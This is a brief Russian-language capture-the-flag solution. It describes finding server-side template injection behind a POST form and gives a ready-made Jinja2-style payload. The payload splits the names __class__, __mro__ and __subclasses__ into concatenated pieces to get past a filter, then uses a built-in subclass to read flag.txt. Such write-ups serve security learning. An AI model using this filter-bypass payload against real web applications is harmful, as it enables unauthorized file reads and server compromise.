# Solution

При переходе на страницу видна одна post форма. Пробуем отправить данные - меняется страница.
Пробуем эксплуатировать Server-Side-Template-Injection. Стоит фильтр на __class__, __mro__ и т.д.
Готовый bypass:
{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subclas'+'ses__']()[40]('fla'+'g.txt').read()}}
